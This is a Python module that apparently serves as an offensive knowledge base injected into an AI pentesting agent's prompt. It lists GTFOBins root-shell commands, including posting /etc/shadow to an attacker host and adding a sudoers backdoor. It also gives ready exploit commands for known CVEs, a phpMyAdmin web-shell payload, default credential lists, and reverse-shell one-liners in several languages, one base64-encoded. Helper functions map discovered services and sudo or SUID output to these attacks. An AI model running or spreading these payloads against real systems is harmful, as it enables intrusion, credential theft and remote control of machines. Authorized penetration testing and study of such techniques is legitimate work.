"""Offensive security knowledge base.

Gives the agent instant recognition of common targets instead of wasting
tool calls on searchsploit for things any pentester would know.
Injected into the system prompt when a matching service is discovered.
"""

from __future__ import annotations

# ── GTFOBins: binary → privesc techniques ────────────────────────
# Format: binary -> {technique -> command}

GTFOBINS = {
    'python': {
        'sudo': 'sudo python -c \'import os; os.system("/bin/bash")\'',
        'suid': 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'capabilities': 'python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
    },
    'python3': {
        'sudo': 'sudo python3 -c \'import os; os.system("/bin/bash")\'',
        'suid': 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        'capabilities': '/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
    },
    'vim': {
        'sudo': 'sudo vim -c \':!bash\'',
        'suid': 'vim -c \':py import os; os.execl("/bin/sh", "sh", "-p")\'',
    },
    'vi': {
        'sudo': 'sudo vi -c \':!bash\'',
    },
    'nano': {
        'sudo': 'sudo nano → Ctrl+R → Ctrl+X → reset; bash 1>&0 2>&0',
    },
    'nmap': {
        'sudo': 'TF=$(mktemp); echo \'os.execute("/bin/bash")\' > $TF && sudo nmap --script=$TF',
        'suid': 'nmap --interactive → !sh',
    },
    'find': {
        'sudo': 'sudo find / -exec /bin/bash \\; -quit',
        'suid': 'find / -exec /bin/sh -p \\; -quit',
    },
    'awk': {
        'sudo': 'sudo awk \'BEGIN {system("/bin/bash")}\'',
    },
    'perl': {
        'sudo': 'sudo perl -e \'exec "/bin/bash";\'',
        'suid': 'perl -e \'exec "/bin/sh";\'',
        'capabilities': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'',
    },
    'ruby': {
        'sudo': 'sudo ruby -e \'exec "/bin/bash"\'',
    },
    'node': {
        'sudo': 'sudo node -e \'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})\'',
    },
    'less': {
        'sudo': 'sudo less /etc/hosts → !bash',
    },
    'more': {
        'sudo': 'sudo more /etc/hosts → !bash',
    },
    'man': {
        'sudo': 'sudo man man → !bash',
    },
    'ftp': {
        'sudo': 'sudo ftp → !bash',
    },
    'socat': {
        'sudo': 'sudo socat stdin exec:/bin/bash',
    },
    'zip': {
        'sudo': 'TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT \'bash #\'',
    },
    'tar': {
        'sudo': 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash',
    },
    'gcc': {
        'sudo': 'sudo gcc -wrapper /bin/bash,-s .',
    },
    'docker': {
        'sudo': 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash',
        'group': 'docker run -v /:/mnt --rm -it alpine chroot /mnt bash',
    },
    'lxc': {
        'group': 'lxc init ubuntu:16.04 test -c security.privileged=true && lxc config device add test whatever disk source=/ path=/mnt/root recursive=true && lxc start test && lxc exec test /bin/bash',
    },
    'env': {
        'sudo': 'sudo env /bin/bash',
    },
    'cp': {
        'sudo': 'Copy /etc/shadow, crack hashes',
        'suid': 'cp /etc/shadow /tmp/shadow (then crack offline)',
    },
    'wget': {
        'sudo': 'sudo wget --post-file=/etc/shadow http://ATTACKER/',
    },
    'curl': {
        'sudo': 'sudo curl file:///etc/shadow -o /tmp/shadow',
    },
    'tee': {
        'sudo': 'echo "attacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers',
    },
    'systemctl': {
        'sudo': 'sudo systemctl → !bash (in pager)',
    },
    'journalctl': {
        'sudo': 'sudo journalctl → !bash (in pager)',
    },
    'service': {
        'sudo': 'sudo service ../../bin/bash',
    },
    'apt': {
        'sudo': 'sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash',
    },
    'screen': {
        'suid': 'screen (version < 4.5.0 — CVE-2017-5618)',
    },
    'php': {
        'sudo': 'sudo php -r "system(\\"/bin/bash\\");"',
    },
    'lua': {
        'sudo': 'sudo lua -e \'os.execute("/bin/bash")\'',
    },
    'ed': {
        'sudo': 'sudo ed → !/bin/bash',
    },
    'git': {
        'sudo': 'sudo git -p help config → !bash',
    },
    'ssh': {
        'sudo': 'sudo ssh -o ProxyCommand=\';bash 0<&2 1>&2\' x',
    },
    'tmux': {
        'sudo': 'sudo tmux',
    },
    'strace': {
        'sudo': 'sudo strace -o /dev/null /bin/bash',
    },
    'ltrace': {
        'sudo': 'sudo ltrace -b -L /bin/bash',
    },
    'pkexec': {
        'suid': 'CVE-2021-4034 (pwnkit) — if pkexec version is vulnerable',
    },
    'base64': {
        'sudo': 'sudo base64 /etc/shadow | base64 -d',
    },
    'xxd': {
        'sudo': 'sudo xxd /etc/shadow | xxd -r',
    },
    'dd': {
        'sudo': 'sudo dd if=/etc/shadow of=/tmp/shadow',
    },
}


# ── Known Vulnerable Services: version string → exploit info ─────
# Matched against nmap service versions. Keys are lowercased for matching.

KNOWN_EXPLOITS = {
    'vsftpd 2.3.4': {
        'cve': 'CVE-2011-2523',
        'severity': 'critical',
        'description': 'vsftpd 2.3.4 backdoor — trigger with `:)` in FTP username',
        'exploit': 'msfconsole: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run',
    },
    'proftpd 1.3.5': {
        'cve': 'CVE-2015-3306',
        'severity': 'critical',
        'description': 'ProFTPd 1.3.5 mod_copy — arbitrary file copy without auth',
        'exploit': 'site cpfr /etc/passwd → site cpto /tmp/passwd (via FTP)',
    },
    'openssh 7.2': {
        'cve': 'CVE-2016-6210',
        'severity': 'medium',
        'description': 'OpenSSH 7.2 user enumeration via timing attack',
        'exploit': 'Use auxiliary/scanner/ssh/ssh_enumusers in MSF',
    },
    'apache 2.4.49': {
        'cve': 'CVE-2021-41773',
        'severity': 'critical',
        'description': 'Apache 2.4.49 path traversal + RCE',
        'exploit': "curl 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; id'",
    },
    'apache 2.4.50': {
        'cve': 'CVE-2021-42013',
        'severity': 'critical',
        'description': 'Apache 2.4.50 path traversal (bypass for CVE-2021-41773)',
        'exploit': "curl 'http://TARGET/cgi-bin/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/bin/sh' -d 'echo; id'",
    },
    'werkzeug': {
        'cve': '',
        'severity': 'high',
        'description': 'Werkzeug debugger console (if /console is exposed)',
        'exploit': 'Navigate to /console — execute arbitrary Python code',
    },
    'tomcat': {
        'cve': '',
        'severity': 'high',
        'description': 'Apache Tomcat — check /manager/html with default creds',
        'exploit': 'Try tomcat:tomcat, admin:admin, tomcat:s3cret at /manager/html. If accessible, deploy a WAR shell.',
    },
    'webmin': {
        'cve': 'CVE-2019-15107',
        'severity': 'critical',
        'description': 'Webmin < 1.920 unauthenticated RCE via password_change.cgi',
        'exploit': 'msfconsole: use exploit/linux/http/webmin_backdoor',
    },
    'drupal': {
        'cve': 'CVE-2018-7600',
        'severity': 'critical',
        'description': 'Drupalgeddon2 — Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1 RCE',
        'exploit': 'msfconsole: use exploit/unix/webapp/drupal_drupalgeddon2',
    },
    'wordpress': {
        'cve': '',
        'severity': 'medium',
        'description': 'WordPress — enumerate users/plugins, check for vulnerable plugins',
        'exploit': 'wpscan --url http://TARGET --enumerate u,p,t (or use execute_command)',
    },
    'samba 3': {
        'cve': 'CVE-2017-7494',
        'severity': 'critical',
        'description': 'Samba 3.5.0-4.4.14 — SambaCry RCE (like WannaCry for Linux)',
        'exploit': 'msfconsole: use exploit/linux/samba/is_known_pipename',
    },
    'samba 4.5': {
        'cve': 'CVE-2017-7494',
        'severity': 'critical',
        'description': 'Samba < 4.5.10 — SambaCry RCE',
        'exploit': 'msfconsole: use exploit/linux/samba/is_known_pipename',
    },
    'smbd 3.0.20': {
        'cve': 'CVE-2007-2447',
        'severity': 'critical',
        'description': 'Samba 3.0.20 < 3.0.25rc3 — username map script RCE',
        'exploit': 'msfconsole: use exploit/multi/samba/usermap_script',
    },
    'distcc': {
        'cve': 'CVE-2004-2687',
        'severity': 'critical',
        'description': 'distccd unauthenticated command execution',
        'exploit': 'msfconsole: use exploit/unix/misc/distcc_exec',
    },
    'shellshock': {
        'cve': 'CVE-2014-6271',
        'severity': 'critical',
        'description': 'Bash Shellshock — RCE via CGI scripts',
        'exploit': "curl -A '() { :; }; echo; /bin/id' http://TARGET/cgi-bin/SCRIPT",
    },
    'phpmyadmin': {
        'cve': '',
        'severity': 'high',
        'description': 'phpMyAdmin — try root:(empty), root:root, root:password',
        'exploit': 'Access via browser, use SQL to write a web shell: SELECT "<?php system($_GET[cmd]); ?>" INTO OUTFILE "/var/www/html/shell.php"',
    },
    'jenkins': {
        'cve': '',
        'severity': 'high',
        'description': 'Jenkins — check for unauthenticated script console at /script',
        'exploit': 'Groovy: "id".execute().text or use MSF exploit/multi/http/jenkins_script_console',
    },
    'elasticsearch': {
        'cve': 'CVE-2015-1427',
        'severity': 'critical',
        'description': 'Elasticsearch < 1.4.3 — dynamic scripting RCE',
        'exploit': 'msfconsole: use exploit/multi/elasticsearch/script_mvel_rce',
    },
    'redis': {
        'cve': '',
        'severity': 'high',
        'description': 'Redis — unauthenticated access allows RCE via cron/ssh key injection',
        'exploit': 'redis-cli -h TARGET → CONFIG SET dir /var/spool/cron/ → write crontab with reverse shell',
    },
    'mongodb': {
        'cve': '',
        'severity': 'high',
        'description': 'MongoDB — unauthenticated access (no auth by default)',
        'exploit': 'mongo TARGET:27017 → show dbs → dump credentials',
    },
    'cups': {
        'cve': 'CVE-2024-47176',
        'severity': 'critical',
        'description': 'CUPS < 2.0.8 — multiple RCE vectors',
        'exploit': 'Check for cups-browsed listening on UDP 631, IPP injection',
    },
}


# ── Default Credentials ─────────────────────────────────────────

DEFAULT_CREDENTIALS = {
    'ftp': [
        ('anonymous', ''),
        ('anonymous', 'anonymous'),
        ('ftp', 'ftp'),
        ('admin', 'admin'),
    ],
    'ssh': [
        ('root', 'root'),
        ('root', 'toor'),
        ('admin', 'admin'),
        ('user', 'user'),
    ],
    'tomcat': [
        ('tomcat', 'tomcat'),
        ('tomcat', 's3cret'),
        ('admin', 'admin'),
        ('admin', 'tomcat'),
        ('manager', 'manager'),
    ],
    'mysql': [
        ('root', ''),
        ('root', 'root'),
        ('root', 'password'),
        ('admin', 'admin'),
    ],
    'postgresql': [
        ('postgres', 'postgres'),
        ('postgres', 'password'),
    ],
    'smb': [
        ('guest', ''),
        ('admin', 'admin'),
        ('administrator', 'password'),
    ],
    'snmp': [
        ('public', ''),
        ('private', ''),
    ],
    'wordpress': [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', 'wordpress'),
    ],
    'phpmyadmin': [
        ('root', ''),
        ('root', 'root'),
        ('root', 'password'),
    ],
    'jenkins': [
        ('admin', 'admin'),
        ('admin', 'password'),
    ],
    'webmin': [
        ('admin', 'admin'),
        ('root', 'password'),
    ],
    'redis': [
        ('', ''),  # No auth by default
    ],
}


# ── Reverse Shell One-Liners ────────────────────────────────────

REVERSE_SHELLS = {
    'bash': "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
    'bash_encoded': "bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx}|{base64,-d}|{bash,-i}'",
    'python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'nc_mkfifo': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
    'nc_e': "nc -e /bin/sh LHOST LPORT",
    'perl': "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    'php': "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'ruby': "ruby -rsocket -e'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'powershell': "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"",
}


def match_service_to_exploits(name: str, version: str) -> list[dict]:
    """Check if a discovered service matches any known exploit.

    Returns a list of matching exploit entries.
    """
    matches = []
    search_str = f"{name} {version}".lower().strip()

    for key, exploit in KNOWN_EXPLOITS.items():
        if key.lower() in search_str or search_str.startswith(key.lower()):
            matches.append(exploit)

    # Also check just the service name for generic matches (tomcat, wordpress, etc.)
    name_lower = name.lower()
    for key, exploit in KNOWN_EXPLOITS.items():
        if key.lower() == name_lower and exploit not in matches:
            matches.append(exploit)

    return matches


def get_gtfobins_for_binary(binary: str) -> dict[str, str] | None:
    """Check if a binary has known GTFOBins privesc techniques."""
    # Normalize: /usr/bin/python3 → python3
    base = binary.rsplit('/', 1)[-1] if '/' in binary else binary
    # Handle python3.8 → python3
    for prefix in ('python3', 'python2', 'python'):
        if base.startswith(prefix):
            base = prefix
            break
    return GTFOBINS.get(base)


def get_privesc_advice(sudo_output: str = "", suid_binaries: list[str] = None,
                       capabilities: str = "") -> list[str]:
    """Analyze privesc enumeration output and return actionable advice."""
    advice = []

    # Parse sudo -l output
    if sudo_output:
        # Look for NOPASSWD entries
        for line in sudo_output.split('\n'):
            line_lower = line.lower().strip()
            if 'nopasswd' in line_lower or '(all)' in line_lower or '(root)' in line_lower:
                # Extract the binary
                parts = line.strip().split()
                for part in parts:
                    if part.startswith('/'):
                        binary = part.split('/')[-1]
                        techniques = get_gtfobins_for_binary(binary)
                        if techniques and 'sudo' in techniques:
                            advice.append(f"SUDO PRIVESC: {binary} → {techniques['sudo']}")
                        elif binary:
                            advice.append(f"SUDO: Can run {part} as root — check GTFOBins for {binary}")

    # Check SUID binaries
    if suid_binaries:
        for binary_path in suid_binaries:
            binary = binary_path.strip().rsplit('/', 1)[-1]
            techniques = get_gtfobins_for_binary(binary)
            if techniques and 'suid' in techniques:
                advice.append(f"SUID PRIVESC: {binary_path} → {techniques['suid']}")

    # Check capabilities
    if capabilities:
        if 'cap_setuid' in capabilities:
            # Extract the binary path
            for line in capabilities.split('\n'):
                if 'cap_setuid' in line:
                    binary_path = line.split()[0] if line.split() else ''
                    binary = binary_path.rsplit('/', 1)[-1]
                    techniques = get_gtfobins_for_binary(binary)
                    if techniques and 'capabilities' in techniques:
                        advice.append(f"CAPABILITY PRIVESC: {binary_path} has cap_setuid → {techniques['capabilities']}")
                    else:
                        advice.append(f"CAPABILITY PRIVESC: {binary_path} has cap_setuid — use to set UID to 0")

    return advice
